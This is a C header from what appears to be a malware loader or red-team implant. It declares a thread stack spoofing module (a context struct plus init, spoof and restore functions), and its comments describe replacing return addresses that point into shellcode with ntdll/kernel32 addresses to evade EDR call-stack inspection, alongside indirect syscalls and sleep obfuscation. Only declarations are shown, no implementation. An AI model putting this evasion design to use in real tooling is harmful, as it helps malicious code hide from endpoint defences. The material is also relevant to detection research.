#pragma once
#include "common.h"

/*
 * Thread Stack Spoofing
 *
 * EDRs inspect the call stack when a thread makes a syscall or sleeps.
 * If the return addresses point to unbacked memory (our shellcode/loader),
 * it's flagged as suspicious.
 *
 * This module walks the current thread's stack frames and replaces
 * return addresses with legitimate ones (pointing to ntdll/kernel32),
 * then restores them after the sensitive operation completes.
 *
 * Combined with indirect syscalls (return addr already in ntdll) and
 * sleep obfuscation, this makes the entire call stack look clean.
 */

#define MAX_SPOOF_FRAMES 32

typedef struct _STACK_SPOOF_CTX {
    ULONG_PTR original_ret_addrs[MAX_SPOOF_FRAMES];
    PVOID     frame_locations[MAX_SPOOF_FRAMES];
    DWORD     frame_count;
    BOOL      is_spoofed;
} STACK_SPOOF_CTX, *PSTACK_SPOOF_CTX;

/* Initialize — find legitimate return addresses to use as replacements */
BOOL StackSpoofInit(void);

/* Spoof the current thread's stack (call before sleep/sensitive ops) */
BOOL SpoofStack(PSTACK_SPOOF_CTX ctx);

/* Restore the original stack (call after waking up) */
BOOL DespoofStack(PSTACK_SPOOF_CTX ctx);
